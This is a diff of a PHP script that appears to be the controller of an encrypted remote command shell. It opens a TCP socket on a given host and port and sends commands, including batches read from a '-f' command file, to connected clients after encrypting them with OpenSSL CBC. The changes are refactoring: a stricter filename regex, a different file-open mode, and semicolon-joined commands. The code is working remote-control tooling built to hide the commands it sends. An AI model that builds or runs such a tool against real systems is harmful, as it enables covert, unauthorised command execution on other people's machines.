@@ -8,12 +8,11 @@
 
 	$opensslpath = './Openssl_EncryptDecrypt.php';
 	$opts = getopt("h:p:",["host:","port:"]);
-	$log  = '';
-	$err  = '';
+	$log = $err = '';
 
 	(count($opts) === 2) || die("[\33[91m!\33[0m] assign remote ip [-h/--host] and port [-p/--port]\n");
-	$host_addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
-	$host_port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
+	$host_addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
+	$host_port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
 
 	($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP))
 	|| die("[\33[91m!\33[0m] socket_create() failed: reason: "
@@ -176,18 +175,18 @@
 			socket_close($master_sock);	
 			exit(0);
 		}
-		// reading/sending a file of commands
-		else if(preg_match('/^(\-f)\s(\.{0,2}\/)*\w*\.\w{2,3}$/', $line))
+		// reading/sending a file of commands (must be in same folder)
+		else if(preg_match('/^\-f{1}\s?\.{0,2}\/{1}\.{0,1}\w+\.{0,1}\w{0,3}$/', $line))
 		{
 			$file = substr($line, 3);
 			if(file_exists($file))
 			{
-				$fp = fopen($file, 'rb');
+				$fp = fopen($file, 'r');
 				$cmdsarr = explode("\n", fread($fp, filesize($file))); // 1 line 1 cmd
 				fclose($fp);
 				$full_cmd = "";
 				
-				foreach($cmdsarr as $cmd){ $full_cmd .= trim($cmd); }
+				foreach($cmdsarr as $cmd){ $full_cmd .= trim($cmd).';'; }
 				$full_cmd = $openssl_encrypt_decrypt->encrypt_cbc($full_cmd);
 				foreach($write as $send_sock)
 		  		{
